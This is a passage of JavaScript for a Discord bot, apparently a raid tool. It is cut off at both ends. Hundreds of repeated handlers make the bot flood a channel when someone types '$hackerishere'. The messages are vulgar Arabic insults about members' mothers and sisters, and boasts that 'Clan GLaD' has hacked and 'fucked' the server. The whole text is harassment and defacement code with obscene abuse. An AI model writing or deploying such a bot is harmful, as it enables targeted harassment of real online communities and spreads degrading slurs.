        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
